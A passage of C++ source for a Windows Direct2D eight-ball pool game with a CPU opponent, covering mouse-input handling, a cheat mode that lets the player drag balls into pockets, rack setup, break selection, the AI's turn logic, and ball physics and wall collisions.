                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        clickedPocketIndex = i;
                        break;
                    }
                }

                if (clickedPocketIndex != -1) {
                    // A pocket was clicked. Update the selection but STAY in the choosing state.
                    // This allows the player to click another pocket to change their mind.
                    if (currentPlayer == 1) calledPocketP1 = clickedPocketIndex;
                    else calledPocketP2 = clickedPocketIndex;
                    InvalidateRect(hwnd, NULL, FALSE); // Redraw to show the arrow has moved.
                    return 0; // Consume the click and wait for the next action.
                }

                // If the player clicks the CUE BALL, that confirms their pocket selection.
                Ball* cueBall = GetCueBall();
                int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
                if (cueBall && calledPocket != -1 && GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y) < BALL_RADIUS * BALL_RADIUS * 25) {
                    // A pocket has been selected, and the player now clicks the cue ball.
                    // NOW we transition to the normal aiming state.
                    currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                    pocketCallMessage = L""""; // Clear the ""Choose a pocket..."" message
                    isAiming = true; // Prepare for aiming
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y); // Use your existing aim start variable
                    return 0;
                }

                // If they click anywhere else (not a pocket, not the cue ball), do nothing.
                return 0;
            }
            // --- END OF THE NEW BLOCK ---
            */
            //new code ends here

            if (cheatModeEnabled) {
                // Allow dragging any ball freely
                for (Ball& ball : balls) {
                    float distSq = GetDistanceSq(ball.x, ball.y, (float)ptMouse.x, (float)ptMouse.y);
                    if (distSq <= BALL_RADIUS * BALL_RADIUS * 4) { // Click near ball
                        isDraggingCueBall = true;
                        draggingBallId = ball.id;
                        if (ball.id == 0) {
                            // If dragging cue ball manually, ensure we stay in Ball-In-Hand state
                            if (currentPlayer == 1)
                                currentGameState = BALL_IN_HAND_P1;
                            else if (currentPlayer == 2 && !isPlayer2AI)
                                currentGameState = BALL_IN_HAND_P2;
                        }
                        return 0;
                    }
                }
            }

            Ball* cueBall = GetCueBall(); // Declare and get cueBall pointer            

            // Check which player is allowed to interact via mouse click
            bool canPlayerClickInteract = ((currentPlayer == 1) || (currentPlayer == 2 && !isPlayer2AI));
            // Define states where interaction is generally allowed
            bool canInteractState = (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
                currentGameState == AIMING || currentGameState == BREAKING ||
                currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 ||
                currentGameState == PRE_BREAK_PLACEMENT);

            // Check Spin Indicator first (Allow if player's turn/aim phase)
            if (canPlayerClickInteract && canInteractState) {
                float spinDistSq = GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, spinIndicatorCenter.x, spinIndicatorCenter.y);
                if (spinDistSq < spinIndicatorRadius * spinIndicatorRadius * 1.2f) {
                    isSettingEnglish = true;
                    float dx = (float)ptMouse.x - spinIndicatorCenter.x;
                    float dy = (float)ptMouse.y - spinIndicatorCenter.y;
                    float dist = GetDistance(dx, dy, 0, 0);
                    if (dist > spinIndicatorRadius) { dx *= spinIndicatorRadius / dist; dy *= spinIndicatorRadius / dist; }
                    cueSpinX = dx / spinIndicatorRadius;
                    cueSpinY = dy / spinIndicatorRadius;
                    isAiming = false; isDraggingStick = false; isDraggingCueBall = false;
                    return 0;
                }
            }

            if (!cueBall) return 0;

            // Check Ball-in-Hand placement/drag
            bool isPlacingBall = (currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT);
            bool isPlayerAllowedToPlace = (isPlacingBall &&
                ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                    (currentPlayer == 2 && !isPlayer2AI && currentGameState == BALL_IN_HAND_P2) ||
                    (currentGameState == PRE_BREAK_PLACEMENT))); // Allow current player in break setup

            if (isPlayerAllowedToPlace) {
                float distSq = GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y);
                if (distSq < BALL_RADIUS * BALL_RADIUS * 9.0f) {
                    isDraggingCueBall = true;
                    isAiming = false; isDraggingStick = false;
                }
                else {
                    bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                    if (IsValidCueBallPosition((float)ptMouse.x, (float)ptMouse.y, behindHeadstring)) {
                        cueBall->x = (float)ptMouse.x; cueBall->y = (float)ptMouse.y;
                        cueBall->vx = 0; cueBall->vy = 0;
                        isDraggingCueBall = false;
                        // Transition state
                        if (currentGameState == PRE_BREAK_PLACEMENT) currentGameState = BREAKING;
                        else if (currentGameState == BALL_IN_HAND_P1) currentGameState = PLAYER1_TURN;
                        else if (currentGameState == BALL_IN_HAND_P2) currentGameState = PLAYER2_TURN;
                        cueAngle = 0.0f;
                    }
                }
                return 0;
            }

            // Check for starting Aim (Cue Ball OR Stick)
            bool canAim = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == BREAKING)) ||
                (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == BREAKING)));

            if (canAim) {
                const float stickDrawLength = 150.0f * 1.4f;
                float currentStickAngle = cueAngle + PI;
                D2D1_POINT_2F currentStickEnd = D2D1::Point2F(cueBall->x + cosf(currentStickAngle) * stickDrawLength, cueBall->y + sinf(currentStickAngle) * stickDrawLength);
                D2D1_POINT_2F currentStickTip = D2D1::Point2F(cueBall->x + cosf(currentStickAngle) * 5.0f, cueBall->y + sinf(currentStickAngle) * 5.0f);
                float distToStickSq = PointToLineSegmentDistanceSq(D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y), currentStickTip, currentStickEnd);
                float stickClickThresholdSq = 36.0f;
                float distToCueBallSq = GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y);
                float cueBallClickRadiusSq = BALL_RADIUS * BALL_RADIUS * 25;

                bool clickedStick = (distToStickSq < stickClickThresholdSq);
                bool clickedCueArea = (distToCueBallSq < cueBallClickRadiusSq);

                if (clickedStick || clickedCueArea) {
                    isDraggingStick = clickedStick && !clickedCueArea;
                    isAiming = clickedCueArea;
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
                    shotPower = 0;
                    float dx = (float)ptMouse.x - cueBall->x;
                    float dy = (float)ptMouse.y - cueBall->y;
                    if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                    if (currentGameState != BREAKING) currentGameState = AIMING;
                }
            }
            return 0;
        } // End WM_LBUTTONDOWN


        case WM_LBUTTONUP: {
            // --- FOOLPROOF FIX for Cheat Mode Scoring ---
            if (cheatModeEnabled && draggingBallId != -1) {
                Ball* b = GetBallById(draggingBallId);
                if (b) {
                    for (int p = 0; p < 6; ++p) {
                        float dx = b->x - pocketPositions[p].x;
                        float dy = b->y - pocketPositions[p].y;
                        if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                            // --- This is the new, ""smarter"" logic ---
                            b->isPocketed = true; // Pocket the ball visually.

                            // If the table is open, assign types based on this cheated ball.
                            if (player1Info.assignedType == BallType::NONE && b->id != 0 && b->id != 8) {
                                AssignPlayerBallTypes(b->type, false);
                            }

                            // Now, correctly update the score for the right player.
                            if (b->id != 0 && b->id != 8) {
                                if (b->type == player1Info.assignedType) {
                                    player1Info.ballsPocketedCount++;
                                }
                                else if (b->type == player2Info.assignedType) {
                                    player2Info.ballsPocketedCount++;
                                }
                            }
                            break; // Stop checking pockets.
                        }
                    }
                }
            }

            /*if (cheatModeEnabled && draggingBallId != -1) {
                Ball* b = GetBallById(draggingBallId);
                if (b) {
                    for (int p = 0; p < 6; ++p) {
                        float dx = b->x - pocketPositions[p].x;
                        float dy = b->y - pocketPositions[p].y;
                        if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                            // --- Assign ball type on first cheat-pocket if table still open ---
                            if (player1Info.assignedType == BallType::NONE
                                && player2Info.assignedType == BallType::NONE
                                && (b->type == BallType::SOLID || b->type == BallType::STRIPE))
                            {
                                // In cheat mode, let's just assign to the current player
                                AssignPlayerBallTypes(b->type);
                            }
                            b->isPocketed = true;
                            pocketedThisTurn.push_back(b->id);

                            // --- FIX FOR CHEAT MODE SCORING ---
                            // Immediately increment the correct player's count based on ball type,
                            // not whose turn it is.
                            if (b->id != 0 && b->id != 8) {
                                if (b->type == player1Info.assignedType) {
                                    player1Info.ballsPocketedCount++;
                                }
                                else if (b->type == player2Info.assignedType) {
                                    player2Info.ballsPocketedCount++;
                                }
                            }
                            // --- END FIX ---
                            // --- NEW: If this was the 7th ball, trigger the arrow call UI ---
                            if (b->id != 8) {
                                PlayerInfo& shooter = (currentPlayer == 1 ? player1Info : player2Info);
                                if (shooter.ballsPocketedCount >= 7
                                    && calledPocketP1 < 0
                                    && calledPocketP2 < 0)
                                {
                                    currentGameState = (currentPlayer == 1)
                                        ? CHOOSING_POCKET_P1
                                        : CHOOSING_POCKET_P2;
                                }
                                else {
                                    // For any other cheat?pocket, keep the turn so you can continue aiming
                                    currentGameState = (currentPlayer == 1)
                                        ? PLAYER1_TURN
                                        : PLAYER2_TURN;
                                }
                            }
                            // --- NEW: If it was the 8-Ball, award instant victory ---
                            else {
                                currentGameState = GAME_OVER;
                                gameOverMessage = (currentPlayer == 1 ? player1Info.name : player2Info.name)
                                    + std::wstring(L"" Wins!"");
                            }
                            break;
                        }
                    }
                }
            }*/

            ptMouse.x = LOWORD(lParam);
            ptMouse.y = HIWORD(lParam);

            Ball* cueBall = GetCueBall(); // Get cueBall pointer

            // Check for releasing aim drag (Stick OR Cue Ball)
            if ((isAiming || isDraggingStick) &&
                ((currentPlayer == 1 && (currentGameState == AIMING || currentGameState == BREAKING)) ||
                    (!isPlayer2AI && currentPlayer == 2 && (currentGameState == AIMING || currentGameState == BREAKING))))
            {
                bool wasAiming = isAiming;
                bool wasDraggingStick = isDraggingStick;
                isAiming = false; isDraggingStick = false;

                if (shotPower > 0.15f) { // Check power threshold
                    if (currentGameState != AI_THINKING) {
                        firstHitBallIdThisShot = -1; cueHitObjectBallThisShot = false; railHitAfterContact = false; // Reset foul flags
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
                        ApplyShot(shotPower, cueAngle, cueSpinX, cueSpinY);
                        currentGameState = SHOT_IN_PROGRESS;
                        foulCommitted = false; pocketedThisTurn.clear();
                    }
                }
                else if (currentGameState != AI_THINKING) { // Revert state if power too low
                    if (currentGameState == BREAKING) { /* Still breaking */ }
                    else {
                        currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                        if (currentPlayer == 2 && isPlayer2AI) aiTurnPending = false;
                    }
                }
                shotPower = 0; // Reset power indicator regardless
            }

            // Handle releasing cue ball drag (placement)
            if (isDraggingCueBall) {
                isDraggingCueBall = false;
                // Check player allowed to place
                bool isPlacingState = (currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT);
                bool isPlayerAllowed = (isPlacingState &&
                    ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                        (currentPlayer == 2 && !isPlayer2AI && currentGameState == BALL_IN_HAND_P2) ||
                        (currentGameState == PRE_BREAK_PLACEMENT)));

                if (isPlayerAllowed && cueBall) {
                    bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                    if (IsValidCueBallPosition(cueBall->x, cueBall->y, behindHeadstring)) {
                        // Finalize position already set by mouse move
                        // Transition state
                        if (currentGameState == PRE_BREAK_PLACEMENT) currentGameState = BREAKING;
                        else if (currentGameState == BALL_IN_HAND_P1) currentGameState = PLAYER1_TURN;
                        else if (currentGameState == BALL_IN_HAND_P2) currentGameState = PLAYER2_TURN;
                        cueAngle = 0.0f;
                        /* ----------------------------------------------------
                        If the player who now has the turn is already on the
                        8-ball, immediately switch to pocket-selection state.
                        ---------------------------------------------------- */
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN)
                        {
                            CheckAndTransitionToPocketChoice(currentPlayer);
                        }
                    }
                    else { /* Stay in BALL_IN_HAND state if final pos invalid */ }
                }
            }

            // Handle releasing english setting
            if (isSettingEnglish) {
                isSettingEnglish = false;
            }
            return 0;
        } // End WM_LBUTTONUP

        case WM_DESTROY:
            isMusicPlaying = false;
            if (midiDeviceID != 0) {
                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
                SaveSettings(); // Save settings on exit
            }
            PostQuitMessage(0);
            return 0;

        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
        }
        return 0;
    }

    // --- Direct2D Resource Management ---

    HRESULT CreateDeviceResources() {
        HRESULT hr = S_OK;

        // Create Direct2D Factory
        if (!pFactory) {
            hr = D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &pFactory);
            if (FAILED(hr)) return hr;
        }

        // Create DirectWrite Factory
        if (!pDWriteFactory) {
            hr = DWriteCreateFactory(
                DWRITE_FACTORY_TYPE_SHARED,
                __uuidof(IDWriteFactory),
                reinterpret_cast<IUnknown**>(&pDWriteFactory)
            );
            if (FAILED(hr)) return hr;
        }

        // Create Text Formats
        if (!pTextFormat && pDWriteFactory) {
            hr = pDWriteFactory->CreateTextFormat(
                L""Segoe UI"", NULL, DWRITE_FONT_WEIGHT_NORMAL, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL,
                16.0f, L""en-us"", &pTextFormat
            );
            if (FAILED(hr)) return hr;
            // Center align text
            pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
            pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
        }
        if (!pLargeTextFormat && pDWriteFactory) {
            hr = pDWriteFactory->CreateTextFormat(
                L""Impact"", NULL, DWRITE_FONT_WEIGHT_BOLD, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL,
                48.0f, L""en-us"", &pLargeTextFormat
            );
            if (FAILED(hr)) return hr;
            pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING); // Align left
            pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
        }


        // Create Render Target (needs valid hwnd)
        if (!pRenderTarget && hwndMain) {
            RECT rc;
            GetClientRect(hwndMain, &rc);
            D2D1_SIZE_U size = D2D1::SizeU(rc.right - rc.left, rc.bottom - rc.top);

            hr = pFactory->CreateHwndRenderTarget(
                D2D1::RenderTargetProperties(),
                D2D1::HwndRenderTargetProperties(hwndMain, size),
                &pRenderTarget
            );
            if (FAILED(hr)) {
                // If failed, release factories if they were created in this call
                SafeRelease(&pTextFormat);
                SafeRelease(&pLargeTextFormat);
                SafeRelease(&pDWriteFactory);
                SafeRelease(&pFactory);
                pRenderTarget = nullptr; // Ensure it's null on failure
                return hr;
            }
        }

        return hr;
    }

    void DiscardDeviceResources() {
        SafeRelease(&pRenderTarget);
        SafeRelease(&pTextFormat);
        SafeRelease(&pLargeTextFormat);
        SafeRelease(&pDWriteFactory);
        // Keep pFactory until application exit? Or release here too? Let's release.
        SafeRelease(&pFactory);
    }

    void OnResize(UINT width, UINT height) {
        if (pRenderTarget) {
            D2D1_SIZE_U size = D2D1::SizeU(width, height);
            pRenderTarget->Resize(size); // Ignore HRESULT for simplicity here
        }
    }

    // --- Game Initialization ---
    void InitGame() {
        srand((unsigned int)time(NULL)); // Seed random number generator
        isOpeningBreakShot = true; // This is the start of a new game, so the next shot is an opening break.
        aiPlannedShotDetails.isValid = false; // Reset AI planned shot
        aiIsDisplayingAim = false;
        aiAimDisplayFramesLeft = 0;
        // ... (rest of InitGame())

        // --- Ensure pocketed list is clear from the absolute start ---
        pocketedThisTurn.clear();

        balls.clear(); // Clear existing balls

        // Reset Player Info (Names should be set by Dialog/wWinMain/ResetGame)
        player1Info.assignedType = BallType::NONE;
        player1Info.ballsPocketedCount = 0;
        // Player 1 Name usually remains ""Player 1""
        player2Info.assignedType = BallType::NONE;
        player2Info.ballsPocketedCount = 0;
        // Player 2 Name is set based on gameMode in ShowNewGameDialog
            // --- Reset any 8?Ball call state on new game ---
        lastEightBallPocketIndex = -1;
        calledPocketP1 = -1;
        calledPocketP2 = -1;
        pocketCallMessage = L"""";
        aiPlannedShotDetails.isValid = false; // THIS IS THE CRITICAL FIX: Reset the AI's plan.

        // Create Cue Ball (ID 0)
        // Initial position will be set during PRE_BREAK_PLACEMENT state
        balls.push_back({ 0, BallType::CUE_BALL, TABLE_LEFT + TABLE_WIDTH * 0.15f, RACK_POS_Y, 0, 0, CUE_BALL_COLOR, false });

        // --- Create Object Balls (Temporary List) ---
        std::vector<Ball> objectBalls;
        // Solids (1-7, Yellow)
        for (int i = 1; i <= 7; ++i) {
            //objectBalls.push_back({ i, BallType::SOLID, 0, 0, 0, 0, SOLID_COLOR, false });
            objectBalls.push_back({ i, BallType::SOLID, 0,0,0,0,
                        GetBallColor(i), false });
        }
        // Stripes (9-15, Red)
        for (int i = 9; i <= 15; ++i) {
            //objectBalls.push_back({ i, BallType::STRIPE, 0, 0, 0, 0, STRIPE_COLOR, false });
            objectBalls.push_back({ i, BallType::STRIPE, 0,0,0,0,
                        GetBallColor(i), false });
        }
        // 8-Ball (ID 8) - Add it to the list to be placed
        //objectBalls.push_back({ 8, BallType::EIGHT_BALL, 0, 0, 0, 0, EIGHT_BALL_COLOR, false });
        objectBalls.push_back({ 8, BallType::EIGHT_BALL, 0,0,0,0,
              GetBallColor(8), false });


        // --- Racking Logic (Improved) ---
        float spacingX = BALL_RADIUS * 2.0f * 0.866f; // cos(30) for horizontal spacing
        float spacingY = BALL_RADIUS * 2.0f * 1.0f;   // Vertical spacing

        // Define rack positions (0-14 indices corresponding to triangle spots)
        D2D1_POINT_2F rackPositions[15];
        int rackIndex = 0;
        for (int row = 0; row < 5; ++row) {
            for (int col = 0; col <= row; ++col) {
                if (rackIndex >= 15) break;
                float x = RACK_POS_X + row * spacingX;
                float y = RACK_POS_Y + (col - row / 2.0f) * spacingY;
                rackPositions[rackIndex++] = D2D1::Point2F(x, y);
            }
        }

        // Separate 8-ball
        Ball eightBall;
        std::vector<Ball> otherBalls; // Solids and Stripes
        bool eightBallFound = false;
        for (const auto& ball : objectBalls) {
            if (ball.id == 8) {
                eightBall = ball;
                eightBallFound = true;
            }
            else {
                otherBalls.push_back(ball);
            }
        }
        // Ensure 8 ball was actually created (should always be true)
        if (!eightBallFound) {
            // Handle error - perhaps recreate it? For now, proceed.
            eightBall = { 8, BallType::EIGHT_BALL, 0, 0, 0, 0, EIGHT_BALL_COLOR, false };
        }


        // Shuffle the other 14 balls
        // Use std::shuffle if available (C++11 and later) for better randomness
        // std::random_device rd;
        // std::mt19937 g(rd());
        // std::shuffle(otherBalls.begin(), otherBalls.end(), g);
        std::random_shuffle(otherBalls.begin(), otherBalls.end()); // Using deprecated for now

        // --- Place balls into the main 'balls' vector in rack order ---
        // Important: Add the cue ball (already created) first.
        // (Cue ball added at the start of the function now)

        // 1. Place the 8-ball in its fixed position (index 4 for the 3rd row center)
        int eightBallRackIndex = 4;
        eightBall.x = rackPositions[eightBallRackIndex].x;
        eightBall.y = rackPositions[eightBallRackIndex].y;
        eightBall.vx = 0;
        eightBall.vy = 0;
        eightBall.isPocketed = false;
        balls.push_back(eightBall); // Add 8 ball to the main vector

        // 2. Place the shuffled Solids and Stripes in the remaining spots
        size_t otherBallIdx = 0;
        //int otherBallIdx = 0;
        for (int i = 0; i < 15; ++i) {
            if (i == eightBallRackIndex) continue; // Skip the 8-ball spot

            if (otherBallIdx < otherBalls.size()) {
                Ball& ballToPlace = otherBalls[otherBallIdx++];
                ballToPlace.x = rackPositions[i].x;
                ballToPlace.y = rackPositions[i].y;
                ballToPlace.vx = 0;
                ballToPlace.vy = 0;
                ballToPlace.isPocketed = false;
                balls.push_back(ballToPlace); // Add to the main game vector
            }
        }
        // --- End Racking Logic ---


        // --- Determine Who Breaks and Initial State ---
        if (isPlayer2AI) {
            /*// AI Mode: Randomly decide who breaks
            if ((rand() % 2) == 0) {
                // AI (Player 2) breaks
                currentPlayer = 2;
                currentGameState = PRE_BREAK_PLACEMENT; // AI needs to place ball first
                aiTurnPending = true; // Trigger AI logic
            }
            else {
                // Player 1 (Human) breaks
                currentPlayer = 1;
                currentGameState = PRE_BREAK_PLACEMENT; // Human places cue ball
                aiTurnPending = false;*/
            switch (openingBreakMode) {
            case CPU_BREAK:
                currentPlayer = 2; // AI breaks
                currentGameState = PRE_BREAK_PLACEMENT;
                aiTurnPending = true;
                break;
            case P1_BREAK:
                currentPlayer = 1; // Player 1 breaks
                currentGameState = PRE_BREAK_PLACEMENT;
                aiTurnPending = false;
                break;
            case FLIP_COIN_BREAK:
                if ((rand() % 2) == 0) { // 0 for AI, 1 for Player 1
                    currentPlayer = 2; // AI breaks
                    currentGameState = PRE_BREAK_PLACEMENT;
                    aiTurnPending = true;
                }
                else {
                    currentPlayer = 1; // Player 1 breaks
                    currentGameState = PRE_BREAK_PLACEMENT;
                    aiTurnPending = false;
                }
                break;
            default: // Fallback to CPU break
                currentPlayer = 2;
                currentGameState = PRE_BREAK_PLACEMENT;
                aiTurnPending = true;
                break;
            }
        }
        else {
            // Human vs Human, Player 1 always breaks (or could add a flip coin for HvsH too if desired)
            currentPlayer = 1;
            currentGameState = PRE_BREAK_PLACEMENT;
            aiTurnPending = false; // No AI involved
        }

        // Reset other relevant game state variables
        foulCommitted = false;
        gameOverMessage = L"""";
        firstBallPocketedAfterBreak = false;
        // pocketedThisTurn cleared at start
        // Reset shot parameters and input flags
        shotPower = 0.0f;
        cueSpinX = 0.0f;
        cueSpinY = 0.0f;
        isAiming = false;
        isDraggingCueBall = false;
        isSettingEnglish = false;
        cueAngle = 0.0f; // Reset aim angle
    }


    // --------------------------------------------------------------------------------
    // Full GameUpdate(): integrates AI call?pocket ? aim ? shoot (no omissions)
    // --------------------------------------------------------------------------------
    void GameUpdate() {
        // --- 1) Handle an in?flight shot ---
        if (currentGameState == SHOT_IN_PROGRESS) {
            UpdatePhysics();
            // ? clear old 8?ball pocket info before any new pocket checks
            //lastEightBallPocketIndex = -1;
            CheckCollisions();
            CheckPockets(); // FIX: This line was missing. It's essential to check for pocketed balls every frame.

            if (AreBallsMoving()) {
                isAiming = false;
                aiIsDisplayingAim = false;
            }

            if (!AreBallsMoving()) {
                ProcessShotResults();
            }
            return;
        }

        // --- 2) CPU’s turn (table is static) ---
        if (isPlayer2AI && currentPlayer == 2 && !AreBallsMoving()) {
            // ??? If we've just auto?entered AI_THINKING for the 8?ball call, actually make the decision ???
            if (currentGameState == AI_THINKING && aiTurnPending) {
                aiTurnPending = false;        // consume the pending flag
                AIMakeDecision();             // CPU calls its pocket or plans its shot
                return;                       // done this tick
            }

            // ??? Automate the AI pocket?selection click ???
            if (currentGameState == CHOOSING_POCKET_P2) {
                // AI immediately confirms its call and moves to thinking/shooting
                currentGameState = AI_THINKING;
                aiTurnPending = true;
                return; // process on next tick
            }
            // 2A) If AI is displaying its aim line, count down then shoot
            if (aiIsDisplayingAim) {
                aiAimDisplayFramesLeft--;
                if (aiAimDisplayFramesLeft <= 0) {
                    aiIsDisplayingAim = false;
                    if (aiPlannedShotDetails.isValid) {
                        firstHitBallIdThisShot = -1;
                        cueHitObjectBallThisShot = false;
                        railHitAfterContact = false;
                        std::thread([](const TCHAR* soundName) {
                            PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT);
                            }, TEXT(""cue.wav"")).detach();

                            ApplyShot(
                                aiPlannedShotDetails.power,
                                aiPlannedShotDetails.angle,
                                aiPlannedShotDetails.spinX,
                                aiPlannedShotDetails.spinY
                            );
                            aiPlannedShotDetails.isValid = false;
                    }
                    currentGameState = SHOT_IN_PROGRESS;
                    foulCommitted = false;
                    pocketedThisTurn.clear();
                }
                return;
            }

            // 2B) Immediately after calling pocket, transition into AI_THINKING
            if (currentGameState == CHOOSING_POCKET_P2 && aiTurnPending) {
                // Start thinking/shooting right away—no human click required
                currentGameState = AI_THINKING;
                aiTurnPending = false;
                AIMakeDecision();
                return;
            }

            // 2C) If AI has pending actions (break, ball?in?hand, or normal turn)
            if (aiTurnPending) {
                if (currentGameState == BALL_IN_HAND_P2) {
                    AIPlaceCueBall();
                    currentGameState = AI_THINKING;
                    aiTurnPending = false;
                    AIMakeDecision();
                }
                else if (isOpeningBreakShot && currentGameState == PRE_BREAK_PLACEMENT) {
                    AIBreakShot();
                }
                else if (currentGameState == PLAYER2_TURN || currentGameState == BREAKING) {
                    currentGameState = AI_THINKING;
                    aiTurnPending = false;
                    AIMakeDecision();
                }
                return;
            }
        }
    }


    // --- Physics and Collision ---
    void UpdatePhysics() {
        for (size_t i = 0; i < balls.size(); ++i) {
            Ball& b = balls[i];
            if (!b.isPocketed) {
                b.x += b.vx;
                b.y += b.vy;

                // Apply friction
                b.vx *= FRICTION;
                b.vy *= FRICTION;

                // Stop balls if velocity is very low
                if (GetDistanceSq(b.vx, b.vy, 0, 0) < MIN_VELOCITY_SQ) {
                    b.vx = 0;
                    b.vy = 0;
                }

                /* -----------------------------------------------------------------
       Additional clamp to guarantee the ball never escapes the table.
       The existing wall–collision code can momentarily disable the
       reflection test while the ball is close to a pocket mouth;
       that rare case allowed it to ‘slide’ through the cushion and
       leave the board.  We therefore enforce a final boundary check
       after the normal physics step.
       ----------------------------------------------------------------- */
                const float leftBound = TABLE_LEFT + BALL_RADIUS;
                const float rightBound = TABLE_RIGHT - BALL_RADIUS;
                const float topBound = TABLE_TOP + BALL_RADIUS;
                const float bottomBound = TABLE_BOTTOM - BALL_RADIUS;

                if (b.x < leftBound) { b.x = leftBound;   b.vx = fabsf(b.vx); }
                if (b.x > rightBound) { b.x = rightBound;  b.vx = -fabsf(b.vx); }
                if (b.y < topBound) { b.y = topBound;    b.vy = fabsf(b.vy); }
                if (b.y > bottomBound) { b.y = bottomBound; b.vy = -fabsf(b.vy); }
            }
        }
    }

    void CheckCollisions() {
        float left = TABLE_LEFT;
        float right = TABLE_RIGHT;
        float top = TABLE_TOP;
        float bottom = TABLE_BOTTOM;
        const float pocketMouthCheckRadiusSq = (POCKET_RADIUS + BALL_RADIUS) * (POCKET_RADIUS + BALL_RADIUS) * 1.1f;

        // --- Reset Per-Frame Sound Flags ---
        bool playedWallSoundThisFrame = false;
        bool playedCollideSoundThisFrame = false;
        // ---

        for (size_t i = 0; i < balls.size(); ++i) {
            Ball& b1 = balls[i];
            if (b1.isPocketed) continue;

            bool nearPocket[6];
            for (int p = 0; p < 6; ++p) {
                nearPocket[p] = GetDistanceSq(b1.x, b1.y, pocketPositions[p].x, pocketPositions[p].y) < pocketMouthCheckRadiusSq;
            }
            bool nearTopLeftPocket = nearPocket[0];
            bool nearTopMidPocket = nearPocket[1];
            bool nearTopRightPocket = nearPocket[2];
            bool nearBottomLeftPocket = nearPocket[3];
            bool nearBottomMidPocket = nearPocket[4];
            bool nearBottomRightPocket = nearPocket[5];

            bool collidedWallThisBall = false;

            // --- Ball-Wall Collisions ---
            // (Check logic unchanged, added sound calls and railHitAfterContact update)
            // Left Wall
            if (b1.x - BALL_RADIUS < left) {
                if (!nearTopLeftPocket && !nearBottomLeftPocket) {
                    b1.x = left + BALL_RADIUS; b1.vx *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }
            // Right Wall
            if (b1.x + BALL_RADIUS > right) {
                if (!nearTopRightPocket && !nearBottomRightPocket) {
                    b1.x = right - BALL_RADIUS; b1.vx *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }
            // Top Wall
            if (b1.y - BALL_RADIUS < top) {
                if (!nearTopLeftPocket && !nearTopMidPocket && !nearTopRightPocket) {
                    b1.y = top + BALL_RADIUS; b1.vy *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }
            // Bottom Wall
            if (b1.y + BALL_RADIUS > bottom) {
                if (!nearBottomLeftPocket && !nearBottomMidPocket && !nearBottomRightPocket) {
                    b1.y = bottom - BALL_RADIUS; b1.vy *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }

            // Spin effect (Unchanged)
            if (collidedWallThisBall) {
